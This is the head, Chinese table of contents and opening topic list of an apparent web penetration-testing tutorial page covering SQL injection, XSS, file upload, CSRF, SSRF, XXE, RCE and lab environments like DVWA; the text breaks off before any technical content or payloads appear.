<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Safe: 05-渗透测试</title>
<meta name="description" content="WEB安全-渗透测试" />
<meta name="keywords" content="安全, 渗透" />
<meta name="generator" content="Org Mode" />
<link rel="icon" href="/favicon.ico" type="image/x-icon">
<link rel="me" href="https://emacs.ch/@jasperhsu">
<meta name="google-adsense-account" content="ca-pub-1741779893655624">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1741779893655624" crossorigin="anonymous"></script>
<!-- from -->
<!--
<style>#back-to-top{background:#000;-webkit-border-radius:50%;-moz-border-radius:50%;border-radius:50%;bottom:20px;-webkit-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);-moz-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);box-shadow:0 2px 5px 0 rgba(0,0,0,.26);color:#fff;cursor:pointer;display:block;height:56px;opacity:1;outline:0;position:fixed;right:20px;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none;-webkit-transition:bottom .2s,opacity .2s;-o-transition:bottom .2s,opacity .2s;-moz-transition:bottom .2s,opacity .2s;transition:bottom .2s,opacity .2s;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:56px;z-index:1}#back-to-top svg{display:block;fill:currentColor;height:24px;margin:16px auto 0;width:24px}#back-to-top.hidden{bottom:-56px;opacity:0}</style>
-->
<link rel="stylesheet" href="/static/aandds.com/css/main.css">
<link rel="stylesheet" href="/static/aandds.com/css/drollery.min.css">
<script type="text/javascript" src="/static/aandds.com/js/main.js"></script>
<!--
<script id="MathJax-script" async="" src="/static/aandds.com/js/mathjax.js"></script>

<script type="text/javascript" src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
-->
<script>
  window.MathJax = {
    tex: {
      ams: {
        multlineWidth: '85%'
      },
      tags: 'ams',
      tagSide: 'right',
      tagIndent: '.8em'
    },
    chtml: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    svg: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    output: {
      font: 'mathjax-modern',
      displayOverflow: 'overflow'
    }
  };
</script>

<script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
</script>
</head>
<body>
<div id="content" class="content">
<header>
<h1 class="title">Safe: 05-渗透测试</h1>
</header><nav id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#h:32cef2c2-81ce-43b4-84d7-214ab187cda3">SQL 注入漏洞攻防</a>
<ul>
<li><a href="#h:18babe6a-5947-4e74-bb98-3ff6006cfd87">漏洞简介&amp;原理</a></li>
<li><a href="#h:869e394f-d587-44e5-9c34-456207ebaea0">漏洞危害</a></li>
<li><a href="#h:52a86fa9-6510-4e2a-a85d-a30b5f08edc5">SQL注入分类</a>
<ul>
<li><a href="#h:91a48914-c85a-4845-ae6d-8c3eaddc9467">数字型</a></li>
<li><a href="#h:cad939bf-f787-4656-8fd0-4e938db4c5d9">字符型</a></li>
<li><a href="#h:9a893a6a-2e98-4d07-a794-fe5b2dfb0762">Union注入（联合查询注入）</a></li>
<li><a href="#h:8ab4fca9-51e8-4acd-a9ba-d6676e5a23ad">报错注入</a></li>
<li><a href="#h:9570a2be-02f4-4675-aa21-be43371a72bb">盲注</a>
<ul>
<li><a href="#h:b83514e8-6a71-4763-b01e-d7c9f7bfe1de">布尔盲注</a></li>
<li><a href="#h:d139c7d4-990d-4c3b-858d-08d499f4daf0">时间盲注</a></li>
</ul>
</li>
<li><a href="#h:c33bced9-e6d5-4f87-bd99-ff10d290e903">堆叠查询注入</a>
<ul>
<li><a href="#h:41e1257c-491f-4019-955d-22c34b02346d">SQL注入分类总结</a></li>
</ul>
</li>
<li><a href="#h:10680bfb-fd98-4473-8b01-3451fc970b77">二次注入</a></li>
<li><a href="#h:cc9d6a8e-f04c-4b61-a6d6-d6367a0bf6aa">宽字节注入</a></li>
<li><a href="#h:825150d1-c71d-44c3-a210-668fe643a487">http header 和 cookie注入</a></li>
</ul>
</li>
<li><a href="#h:e0fba53d-2c1e-4e21-a618-de20545c2b90">从MySql注入到GetShell</a></li>
<li><a href="#h:b3afa4a1-13a8-44e8-9170-1fc1f153da4d">SQL注入绕过</a>
<ul>
<li><a href="#h:9ca7c970-8169-4f68-b428-641474022d33">大小写绕过</a></li>
<li><a href="#h:16c175ae-ab76-402c-9895-881b61c0a54c">替换关键字</a></li>
<li><a href="#h:9febda33-298f-4f03-9cdc-47ccb8902976">使用编码</a></li>
<li><a href="#h:25e9019e-1401-474c-8f8b-e906ca87fdde">使用注释</a></li>
<li><a href="#h:f3156e41-2342-4b0a-aa58-e4e067ee5a48">等价函数与命令</a></li>
<li><a href="#h:3ebd8964-e263-474c-aef3-c74be86cd609">特殊符号</a></li>
</ul>
</li>
<li><a href="#h:9943ce9a-f6f3-4557-8201-d5e2cf89cdfe">SQL注入防御</a>
<ul>
<li><a href="#h:02cff992-3a0d-4847-a399-4021035779b5">预编译和绑定变量</a></li>
<li><a href="#h:72ca7ca7-50b8-4d46-aec1-c6340f5678b6">严格检查参数的数据类型，使用安全函数</a></li>
</ul>
</li>
<li><a href="#h:ae7adde2-df12-4b82-8330-781d91644a08">SQLmap使用</a>
<ul>
<li><a href="#h:a5a30707-4a81-4e3d-9dd9-6077cd45df9b">SQLmap简介</a></li>
<li><a href="#h:624806d9-c952-46cb-84c0-d143d4b8ad15">下载及安装</a></li>
<li><a href="#h:73ad35d1-7289-4252-9f9f-d0fbcc073d0c">参数详解</a>
<ul>
<li><a href="#h:753dd42f-d650-4c1f-a75a-8e008c9da6e8">Target：目标</a></li>
<li><a href="#h:fa848a7e-4d2b-468a-8d25-de4f301bb150">Request：请求设置</a></li>
<li><a href="#h:f64312b2-09cd-4c62-9c71-24f39096a11c">Optimization：优化</a></li>
<li><a href="#h:102608f0-dc16-460c-9ddd-a2eca3b71d7d">Injection：注入</a></li>
<li><a href="#h:5bab0e28-8151-4b02-82c4-d091bc76397e">Detection：探测等级</a></li>
<li><a href="#h:41025bd1-6892-4fb4-a351-e91defd53d1c">Enumeration：枚举数据</a></li>
<li><a href="#h:df4964d6-4b81-4b08-98e2-488435f6c7a2">Brute force：爆破</a></li>
<li><a href="#h:3b2ea873-5f19-4540-9bf0-0504ab909977">File system access：访问文件系统</a></li>
<li><a href="#h:e1c85b30-5cd4-4ac9-b24d-c61c22d36571">Operating system access：访问操作系统</a></li>
<li><a href="#h:18407a7b-c7e7-4a4a-acff-6f44c3c5bc55">General 通用</a></li>
</ul>
</li>
<li><a href="#h:3d35f3ed-1d59-4298-a63f-a8a807e68d48">实际利用(dvwa)</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:e1186713-9d13-411d-a0ed-91f29738d37e">XSS 漏洞攻防</a>
<ul>
<li><a href="#h:5359444e-f7b8-4b28-afeb-913a907e2b50">XSS基本概念</a></li>
<li><a href="#h:41968a8c-3c2f-469f-9e90-af02ca330221">XSS分类</a>
<ul>
<li><a href="#h:8fd037e2-bb03-4484-9ccd-dff4aa5ec317">反射型</a></li>
<li><a href="#h:02f22346-6572-48a9-9cdd-01a28923ed9d">存储型</a></li>
<li><a href="#h:09374e02-e4c4-4acf-8eb0-e4e3c18c5dd6">DOM型</a></li>
</ul>
</li>
<li><a href="#h:04861855-b2ab-4dac-80c1-494eb3944de0">手工测试</a>
<ul>
<li><a href="#h:f2f56282-8855-40c7-a908-ead701c44b53">反射型 XSS 测试</a>
<ul>
<li><a href="#h:322355b9-5f72-49f1-a931-7134d953c95c">Low</a></li>
<li><a href="#h:d3198962-a915-48a8-8945-39da806e36d9">DOM XSS</a></li>
<li><a href="#h:eb3b336b-d209-4c25-8208-84dee9083b8c">Medium</a></li>
<li><a href="#h:ee79086c-bbff-42c8-aacf-682344b8547c">High</a></li>
</ul>
</li>
<li><a href="#h:bff4e91f-d062-4752-b8a6-04fceba903dc">存储型 XSS 测试</a>
<ul>
<li><a href="#h:8d97e3b5-fc98-46ff-aac7-38eea1373c8c">Low</a></li>
<li><a href="#h:68c481af-2150-494f-907a-a6346dfa2501">Medium</a></li>
<li><a href="#h:666a44a2-d1e2-426b-83c6-f592911d19c9">High</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:0c741e3e-bbeb-4f50-9aa3-485e7ce9e706">XSS盲打</a></li>
<li><a href="#h:2a0c68b8-4a3f-4a9a-b842-063731dcdf71">XSS键盘记录</a></li>
<li><a href="#h:84304d96-198e-45ef-8b91-b66b505d7e82">XSS平台利用—获取cookie</a>
<ul>
<li><a href="#h:9c6d42fd-7c4e-4f67-be44-73855b245db3">初始化自带XSS平台</a></li>
<li><a href="#h:76ec688e-6192-4d0f-baa0-86342134a109">前台XSS盲打攻击获取cookie</a></li>
<li><a href="#h:0c8f232c-14d5-4096-b0fc-57ad5fa33b93">BeEF-XSS</a></li>
</ul>
</li>
<li><a href="#h:9ac0dd43-f3fb-4b2b-9a28-e1cad17aac4b">XSS防御绕过</a>
<ul>
<li><a href="#h:1b083bac-a542-4ab1-a48e-dd7477f64451">过滤不严格</a></li>
<li><a href="#h:fee328dc-578b-4629-8da4-a7a8289b1ab1">HTML实体编码默认配置</a></li>
</ul>
</li>
<li><a href="#h:233e62de-13b3-4c41-a1a6-d2824886d144">XSS安全防御</a>
<ul>
<li><a href="#h:7019afe8-8478-468f-bd69-62f5cc45970b">输入检查</a></li>
<li><a href="#h:5572c855-2c32-432b-be69-584a492cfacf">输出检查（编码）</a>
<ul>
<li><a href="#h:b99bc4b0-cc3a-49b5-9ebf-4e0bfd02874e">HTML实体编码</a></li>
<li><a href="#h:a66c3502-520c-4edf-a860-b79e19abdf47">JavaScript编码</a></li>
</ul>
</li>
<li><a href="#h:7b7dd6fa-8af9-4296-bad6-c32453598175">HttpOnly</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:a0c81906-2e0b-4107-bbef-6c8d3c1e15f7">文件上传及验证绕过</a>
<ul>
<li><a href="#h:63c5dd1f-0ee2-4bd5-b8b4-a2b6acb45d54">文件上传常见点</a></li>
<li><a href="#h:33371723-a05e-49bc-b20d-faccd95b2462">客户端—JS绕过</a>
<ul>
<li><a href="#h:fae3f213-2c89-45c3-927f-44c2d24d9548">禁用JS</a></li>
<li><a href="#h:ae0af946-0554-401e-9b2a-b350a1ae9ae6">后缀名绕过</a></li>
<li><a href="#h:7ffba57b-000a-43e1-93d8-cd39a394b266">修改前端代码</a></li>
</ul>
</li>
<li><a href="#h:15baffb9-eb2c-4066-ba47-bb39a5266e47">服务端黑名单绕过</a>
<ul>
<li><a href="#h:19ad4a01-c405-41d6-b7f3-d5f6ccfce1a8">特殊可解析后缀</a></li>
<li><a href="#h:404b8dcb-5d6b-445d-b32f-4815ffae111d">大小写绕过（√）</a></li>
<li><a href="#h:ce990c04-f5d6-470d-bd94-b0ffb71ef825">点绕过（√）</a></li>
<li><a href="#h:d2c213a1-7fd0-4182-8648-8598d316348e">空格绕过</a></li>
<li><a href="#h:d8f9bf52-1f9c-4872-ba93-0e24dcb20fd3">::$DATA绕过</a></li>
<li><a href="#h:1e7c30a3-5b3f-4395-a736-b9b7659e9aee">配合解析绕过</a></li>
<li><a href="#h:de5e4b0e-bd61-4475-a0d4-14c404bfd686">.htaccess文件绕过（√）</a></li>
<li><a href="#h:c6197d65-bf18-4851-87c0-5f9d10a1f16b">双写后缀名绕过（√）</a></li>
<li><a href="#h:107d8bf7-e12a-4221-8781-08b0183cc27a">小结</a></li>
</ul>
</li>
<li><a href="#h:d45862ce-c977-41e0-b938-ad4251cadd9b">服务端白名单绕过</a>
<ul>
<li><a href="#h:cf7b43b9-b596-4f55-8b4f-9703d8fe8e45">MIME类型检测绕过（√）</a></li>
<li><a href="#h:cb66df48-ff85-4d87-8922-58455854cb23">%00截断绕过（√）</a></li>
</ul>
</li>
<li><a href="#h:4882636f-b217-4f85-a096-c6a882629949">服务端内容检查绕过</a>
<ul>
<li><a href="#h:d0bdff44-8482-44fc-ab56-70633ec3fb4e">文件头检查（√）</a>
<ul>
<li><a href="#h:46bbb15a-e84a-41c3-aa82-4d630b9aa97a">制作图片马</a></li>
<li><a href="#h:633581a8-3855-410b-a3e1-70a5ae87dfc2">文件内容绕过</a></li>
</ul>
</li>
<li><a href="#h:8b86afca-1e8d-4a47-ac5b-82089eb562bb">突破getimagesize及exif_imagetype（√）</a></li>
<li><a href="#h:5fd85b1a-8001-490f-a033-a4b5e614be50">二次渲染绕过（√）</a></li>
<li><a href="#h:16169970-6ce2-4234-bb77-cf2b037d0d89">文件包含绕过</a></li>
</ul>
</li>
<li><a href="#h:62ed4c39-2129-4e18-8924-233f81ad1b43">代码逻辑（条件竞争）</a></li>
<li><a href="#h:3977c995-892b-43f1-8b7c-e278619cef27">总结</a>
<ul>
<li><a href="#h:522650b5-061d-48c9-87d8-f10b335cc924">文件上传漏洞安全防御</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:fc270d37-e9fd-403b-9b5e-97ef965d1b30">文件包含漏洞</a>
<ul>
<li><a href="#h:4ca12ff1-0fc1-4ed5-80a5-9f9c75d50384">概述</a></li>
<li><a href="#h:c2eae595-8499-45ba-9356-6a0d56292d6a">分类</a>
<ul>
<li><a href="#h:295b4323-4294-43c4-8153-2b63d9c91def">本地文件包含</a></li>
<li><a href="#h:a448451a-df42-49d8-9f49-81f1d9f4f0d6">远程文件包含</a></li>
<li><a href="#h:d761c0f9-9961-49cd-bfe0-f33f39bb50fd">远程与本地包含的区别</a></li>
</ul>
</li>
<li><a href="#h:a48f4f73-2a19-45a0-975d-4f1c7c6c7319">PHP中文件包含函数有以下四种</a></li>
<li><a href="#h:6840676c-9532-42c3-9787-a08c4ebd5d84">URL中如果出现了如下内容就可能存在文件包含漏洞</a></li>
<li><a href="#h:31206df2-dd29-4cba-8f42-d2f2de0ffd82">常见的敏感信息路径</a>
<ul>
<li><a href="#h:1c5b03a0-34d2-406c-a54e-6247ebfab953">Windows系统</a></li>
<li><a href="#h:9f63408f-9257-496a-b9f7-be12e13a4c74">Linux/Unix系统</a></li>
</ul>
</li>
<li><a href="#h:4938e724-4c8e-4d7d-b72d-ef4cde15c2ed">如何发现文件包含漏洞</a></li>
<li><a href="#h:d2a0e099-55e8-43e8-91c7-99f4691d2c7c">DVWA演示</a>
<ul>
<li><a href="#h:745677e9-676e-4bc7-ad6f-0c3bdd898382">Low</a></li>
<li><a href="#h:8f4ee67c-f163-4733-8bc2-2ef61d1760d3">Medium</a></li>
<li><a href="#h:0f1e654b-d432-45e5-8e6e-40f450b196f9">High</a></li>
<li><a href="#h:160e3a13-c2d6-438d-adaa-46345d9fbe85">Impossible</a></li>
</ul>
</li>
<li><a href="#h:5f01c332-5b97-4e2c-b443-b834aca7b541">远程文件包含</a></li>
<li><a href="#h:e0f343cc-6b8e-4116-b2f9-f233fbeec697">文件包含getshell</a>
<ul>
<li><a href="#h:95a64dae-41a8-433d-96d5-b80e2f40bc0c">中间件日志包含绕过</a></li>
</ul>
</li>
<li><a href="#h:a1ab2c00-dad7-4e6b-b6e1-1d65506dfa2d">配合文件上传Getshell</a></li>
<li><a href="#h:f6114c46-36e6-45df-b024-7421cac80860">文件包含漏洞防御</a></li>
</ul>
</li>
<li><a href="#h:675d091f-dfa1-4c3a-980d-858f8e6ea264">CSRF 攻防</a>
<ul>
<li><a href="#h:453c8ebd-c527-487c-9bf5-15c834ba5a04">简介</a></li>
<li><a href="#h:22feadf8-4ec5-4029-a17e-daaa649e9e09">DVWA演示</a>
<ul>
<li><a href="#h:ee8405a0-8416-413d-aa7e-cec539135229">Low级别</a></li>
<li><a href="#h:fb417e0b-b5aa-407f-a2bc-ae42311910ef">Medium级别</a></li>
<li><a href="#h:134aa5b2-b768-461a-b0e8-c5022e227d5c">High级别</a></li>
</ul>
</li>
<li><a href="#h:e5431d54-cbb0-435c-8cb8-dab677adad1f">Pikachu演示</a>
<ul>
<li><a href="#h:e3164e3a-1104-41df-bd6b-cb1e08ea68be">电话地址修改 CSRF（GET）</a></li>
<li><a href="#h:7cbe590a-e82b-44de-8b07-007809824205">钓鱼攻击 CSRF（POST）</a></li>
</ul>
</li>
<li><a href="#h:194f19e9-6436-46ce-a1e9-e0852c1f9830">使用Burp生成CSRF利用POC</a></li>
<li><a href="#h:340bafd5-8679-428f-a318-afb686edc1e6">防御CSRF漏洞</a>
<ul>
<li><a href="#h:fa43e364-5c74-40db-bdb8-688fa0d7e054">验证 HTTP Referer 字段</a></li>
<li><a href="#h:ea86db02-cfe1-40a6-a2b0-77572fa578f2">在请求地址中添加 token 并验证</a></li>
<li><a href="#h:fd6e34e0-d96d-4e83-a72d-34a2617de1cb">添加验证码</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:a3723ed5-beb3-4860-b8e1-aa044bbd90b0">SSRF 漏洞</a>
<ul>
<li><a href="#h:c189b0d4-aaa0-4815-8190-04279420b11f">漏洞简介</a>
<ul>
<li><a href="#h:141e9214-d0d5-4af4-8a16-c48bc5eccb71">漏洞原理</a></li>
<li><a href="#h:b1727c8c-65ae-4391-8ab6-058bff10eb3b">漏洞危害</a></li>
</ul>
</li>
<li><a href="#h:6b0224e7-57ec-4c7e-b9aa-af3d9a169eaf">检测与绕过</a>
<ul>
<li><a href="#h:c284bd59-9759-42b5-9cc3-8f2bff700461">漏洞检测</a></li>
<li><a href="#h:5ac443cc-60ba-41b7-b575-180ba6b64ce6">漏洞出现点</a></li>
<li><a href="#h:4d9f1154-eee1-4d94-bc75-25668f5f25e6">漏洞绕过</a>
<ul>
<li><a href="#h:7f56542e-aa87-4dbb-931c-1d53c3396946">场景1：限制为 http://www.xxx.com 域名时</a></li>
<li><a href="#h:24de6a99-2d4c-477e-801d-bb16e7d63a1b">场景2：限制请求IP不为内网地址</a></li>
<li><a href="#h:2cbd37a6-cb3d-44a6-b8b8-7428b6370020">场景3：限制请求只为http协议</a></li>
<li><a href="#h:e527c5de-e674-4205-a07e-6c7f0a957a35">场景4：利用句号绕过</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:21195e03-244c-4a24-ac44-cda3adb25390">查看是否存在SSRF漏洞</a></li>
<li><a href="#h:58d96a3d-1ade-44d3-8a83-de86fed959b1">Pikachu演示</a>
<ul>
<li><a href="#h:b8668c67-e694-4098-a5f1-d9126eabdc51">SSRF（curl）</a></li>
<li><a href="#h:e6a39906-7082-4f83-9007-a6d40035d67c">SSRF（file_get_content）</a></li>
</ul>
</li>
<li><a href="#h:7db87cdd-38fa-48c4-a8cc-1a100e1a54ea">漏洞修复</a></li>
</ul>
</li>
<li><a href="#h:6fc7b780-abcb-4608-920b-6378936449b9">XXE 原理利用防御</a>
<ul>
<li><a href="#h:42bc4153-05e8-44b2-acdd-510a6127a436">简介</a></li>
<li><a href="#h:f0c9aa3c-0f10-49b6-89c3-f584ffec13d6">XML外部实体</a></li>
<li><a href="#h:7ebef884-a0d1-494d-a478-cafbe17d414a">危害</a>
<ul>
<li><a href="#h:3eba7610-5dd7-45e8-bbb5-5056a7a94c93">读取任意文件</a></li>
<li><a href="#h:9c054cbd-7679-4f3d-90dd-93552979face">执行系统命令</a></li>
</ul>
</li>
<li><a href="#h:30bada5d-122b-491a-86a3-7133217a70f9">Pikachu演示</a></li>
<li><a href="#h:5152f6ec-4581-408a-9d53-6d9f0644ade8">XXE的防御</a>
<ul>
<li><a href="#h:7544ef96-b602-46bb-9801-f52f484faec9">禁用外部实体</a></li>
<li><a href="#h:9a686418-a232-4885-bc44-a0b6b6fee3c0">过滤用户提交的XML数据</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:4f4e5d18-a63e-4e5c-b0ab-c9e86d373e51">远程代码执行</a>
<ul>
<li><a href="#h:9160cf7d-8b22-42cd-8956-891a19945529">什么是RCE？</a>
<ul>
<li><a href="#h:9520436c-f06a-4c81-a8b2-e1b83586a470">远程命令执行</a></li>
<li><a href="#h:6bbd5789-1120-4be4-a805-a680cd4485ad">远程代码执行</a></li>
<li><a href="#h:5a853a0c-84ef-437b-8298-dcc0cbdac824">防御</a></li>
</ul>
</li>
<li><a href="#h:6a0e2d70-09c0-4836-bf4e-91d36085ec5d">DVWA演示</a>
<ul>
<li><a href="#h:c495ab32-6185-4c9f-997c-72b0c9195ecd">Low级别</a></li>
<li><a href="#h:9d856801-5c59-4f5e-8af8-78166fa340a5">Medium级别</a></li>
<li><a href="#h:a2959082-9d06-4bbc-8c49-12051b1c2a8e">High级别</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:6789d493-bc97-45f5-bff6-a2c660e6835f">反序列化漏洞</a>
<ul>
<li><a href="#h:e3f783f5-c46d-44fc-a0ba-331bcb00811a">为什么要序列化？</a></li>
<li><a href="#h:f8ce0d07-a150-4fa7-9d6d-6159888d3377">检测方法</a></li>
<li><a href="#h:75a0e896-fee3-43b2-a407-f8c4ddcbf555">漏洞修复</a></li>
</ul>
</li>
<li><a href="#h:71958896-5e7e-4030-b345-ed87ece3529f">编辑漏洞</a>
<ul>
<li><a href="#h:34cd5cbf-ffa3-4a05-b5cc-be6ccfc68338">常规编辑器漏洞介绍</a>
<ul>
<li><a href="#h:24edee9e-f76f-47a6-b745-6d6b8264012f">FCKeditor</a></li>
<li><a href="#h:2b22a1a2-7462-46a8-b49a-3a25f025e915">常规编辑器漏洞攻击还原</a>
<ul>
<li><a href="#h:70bbdc92-c49f-41a1-aa81-95accadb50ac">挖掘编辑器漏洞思路：</a></li>
<li><a href="#h:46d70960-34e0-4b72-bcdf-70984db7761f">FCKeditor编辑器漏洞攻击还原：</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:f7e72031-5f0e-488a-bdf0-02cda6f675ab">旁注、跨库、CDN绕过</a>
<ul>
<li><a href="#h:8d090d88-29e3-4501-a337-98ce6c24a8ac">渗透测试之旁注、跨库</a></li>
<li><a href="#h:1ddb5064-da95-405e-99c6-461849338521">CDN绕过</a>
<ul>
<li><a href="#h:f84d357d-4149-4bb5-b039-01e50e2a5784">查找真实IP方法</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:1684ddc6-8a91-40be-bfca-75e685e146a9">越权漏洞</a>
<ul>
<li><a href="#h:d3b7f053-314a-455b-8347-48a991551232">越权漏洞原理介绍</a></li>
<li><a href="#h:f233dec1-20f9-4cac-bcd7-73d2d42a3ce7">水平越权攻防还原</a></li>
<li><a href="#h:f82dcdf0-3a4d-4fa1-829f-7f58020765a4">垂直越权攻防还原</a></li>
<li><a href="#h:636b9d2a-0618-42ab-930e-5e30b926bff8">越权漏洞修复</a></li>
</ul>
</li>
<li><a href="#h:f92d0900-be8b-4800-bced-5a25c2ef9fa9">逻辑漏洞</a>
<ul>
<li><a href="#h:2f915205-63a9-4341-89d4-43ae5a943c4d">逻辑漏洞概述</a></li>
<li><a href="#h:5cd3f754-1edf-4a1c-8fdd-dacd00e5eb1a">如何挖掘逻辑漏洞</a>
<ul>
<li><a href="#h:2a0a45de-717e-4093-9abe-80d331a18771">注册处</a></li>
<li><a href="#h:8c8bbd12-738a-42af-b7a9-5681e51da22b">登录处</a></li>
<li><a href="#h:b84ac8ef-9646-489f-864d-0547cdaad901">密码找回处</a></li>
<li><a href="#h:3f1b348f-7236-4bef-9df5-bb5dd3eecf64">支付与越权</a></li>
</ul>
</li>
<li><a href="#h:8f512b7e-4ebc-42da-a2f3-e8705aca5a9c">交易支付中的逻辑问题</a>
<ul>
<li><a href="#h:914af5a2-c0c2-44a8-b68f-c76a993dd015">支付逻辑漏洞的呈现形式</a></li>
<li><a href="#h:b8060825-d36e-4958-81fd-7ec957227b67">支付漏洞案例</a></li>
</ul>
</li>
<li><a href="#h:dcfde62b-756f-41b6-901b-5b8e0469f16b">密码修改逻辑漏洞</a></li>
<li><a href="#h:cf5508a5-e935-40a1-ae36-a6b578f276c7">实战项目逻辑漏洞分享</a>
<ul>
<li><a href="#h:7297705a-4501-4f6a-a510-7aa6f9e8bc28">验证码回传导致任意用户注册</a></li>
<li><a href="#h:77cfaa72-78dd-4982-94a6-41a2f7f739cc">任意用户登录</a></li>
<li><a href="#h:9b701b33-983a-4fa1-bace-bfc6856321cb">任意密码重置</a></li>
<li><a href="#h:044a1c80-a036-4460-b33a-c68b58061943">支付漏洞</a></li>
</ul>
</li>
<li><a href="#h:ea84ab4e-8a14-4ab1-9033-ee35aa8af63b">逻辑漏洞修复</a></li>
</ul>
</li>
<li><a href="#h:66d57a3a-46d2-4b33-8107-6aa4878a5904">暴力猜解</a>
<ul>
<li><a href="#h:d6c6e9c9-d208-4894-ae36-81ef58205690">C/S架构暴力破解</a></li>
<li><a href="#h:4a3a8a66-15f9-434e-bb58-e2e5a56f8e2a">B/S架构暴力破解</a></li>
<li><a href="#h:1fe4ab33-6bc6-4740-8032-d07adc4b90ce">hydra(九头蛇)的安装与使用</a>
<ul>
<li><a href="#h:03b49ed5-07e4-4b77-a8a7-1ef3a0503b93">hydra的安装</a></li>
<li><a href="#h:0cb635e1-9dc6-4fde-9107-4408778f0c53">hydra的使用</a></li>
<li><a href="#h:2a7b3ac7-f58f-4cef-a27a-5603055957a0">暴力猜解安全防范</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:1bca79e2-437f-487f-ab0b-a0738aa86541">验证码安全</a>
<ul>
<li><a href="#h:b4118d51-68b2-47b7-bd21-f09eb6512de8">验证码安全介绍及分类</a></li>
<li><a href="#h:d75fa00b-41e1-4f49-852e-02ffeaf930dd">验证码绕过（on client）</a></li>
<li><a href="#h:0156b052-b762-49b6-b2e9-9a5d24b68c14">验证码绕过（on server）</a></li>
</ul>
</li>
<li><a href="#h:2ea92b17-6a80-4931-8790-714820282e22">社会工程学（骗）</a>
<ul>
<li><a href="#h:8064f122-1469-496b-a859-f954caf08723">社会工程学</a></li>
<li><a href="#h:ea56e3f8-50fd-4358-a0f1-e4c043989364">敏感信息收集</a></li>
</ul>
</li>
<li><a href="#h:57853d75-9165-48c0-a637-34c9a24ee880">APT攻击</a>
<ul>
<li><a href="#h:9b64824f-2e93-4025-88f1-4b9766255d5e">APT概述</a>
<ul>
<li><a href="#h:e1803a1d-6318-41d3-8ab6-1049d0c7eeac">APT简介</a></li>
<li><a href="#h:ccb00898-6592-4f05-af9c-c264e1f15e92">APT攻击方式还原</a></li>
</ul>
</li>
<li><a href="#h:7962804d-7525-4d4e-a7bd-9a5348575e1a">APT攻击防范</a></li>
</ul>
</li>
<li><a href="#h:5b8d9a7c-261b-43ee-afb7-86ebfc98c398">常规CTF赛题讲解</a>
<ul>
<li><a href="#h:9b6a27d5-4bec-43ab-ac2b-e4c33456187a">Web-信息泄露</a></li>
<li><a href="#h:a2f926af-741d-467b-a028-8e4af9ca13c3">Web-密码口令</a></li>
<li><a href="#h:43f83cfb-e13d-4034-93ca-18897f6e78d4">Web-SQL注入</a></li>
<li><a href="#h:94aba906-455c-41c7-8a98-7d3c6ae51122">Crypto-base</a></li>
<li><a href="#h:9c2a9d84-7f68-4a9e-aa09-cdc7ea45d689">MISC-数据隐写</a>
<ul>
<li><a href="#h:76f84112-ccc7-4b5c-a960-d2775189c54b">简单隐写</a></li>
</ul>
</li>
<li><a href="#h:717eef06-67cd-4074-b014-e89d9d559ebb">压缩文件爆破</a>
<ul>
<li><a href="#h:745d8afc-4ab4-41be-82d5-97ab10c9f44f">图片base64</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:dbc4c345-9122-4d7e-8300-a81b723964c6">其它漏洞</a></li>
<li><a href="#h:1efd2dff-04cf-4da6-9c13-f73a3d5b157f">靶场</a>
<ul>
<li><a href="#h:89509a7f-3efd-415c-9663-dc1f0591eeb2">dvwa</a></li>
<li><a href="#h:354a4335-99cf-453b-a523-f0c9e1959fea">pikachu</a></li>
<li><a href="#h:29ed530f-5d3a-4b8b-b466-71e5a365b7e9">sqli-labs</a></li>
<li><a href="#h:7655600d-d1cd-4b5e-a960-5e8de254f405">upload-labs</a></li>
<li><a href="#h:b5f8d3eb-5ced-4483-8137-881a3bee4d0b">webug</a></li>
<li><a href="#h:a4690935-f815-40d2-a35f-31ac1a99d2ed">漏洞利用</a></li>
</ul>
</li>
</ul>
</div>
</nav>
<ul class="org-ul">
<li>TAGS: <a href="../index.html">Safe</a></li>
</ul>
<section id="outline-container-h:32cef2c2-81ce-43b4-84d7-214ab187cda3" class="outline-2">
<h2 id="h:32cef2c2-81ce-43b4-84d7-214ab187cda3">SQL 注入漏洞攻防</h2>
<div class="outline-text-2" id="text-h:32cef2c2-81ce-43b4-84d7-214ab187cda3">
<p>
主要内容：
</p>
<ul class="org-ul">
<li>SQL 注入攻击原理</li>
<li>SQL 注入攻击分类及提交方式</li>
<li>Union 联合注入</li>
<li>基于函数报错手工注入(insert update delete)</li>
<li>http Header 及 cookie 手工注入</li>
<li>(布尔型、时间型)手工盲注</li>
<li>宽字节及二阶注入</li>
<li>MySQL + PHP 手工获取 webshell 过程</li>
<li>Cookie 手工实战注入</li>
<li>Cookie 中转及工具注入</li>
<li>伪静态突破</li>
<li>SQL 注入漏洞修复</li>
<li>sqlmap 注入神器高级使用</li>
</ul>
</div>
<div id="outline-container-h:18babe6a-5947-4e74-bb98-3ff6006cfd87" class="outline-3">
<h3 id="h:18babe6a-5947-4e74-bb98-3ff6006cfd87">漏洞简介&amp;原理</h3>
<div class="outline-text-3" id="text-h:18babe6a-5947-4e74-bb98-3ff6006cfd87">
<p>
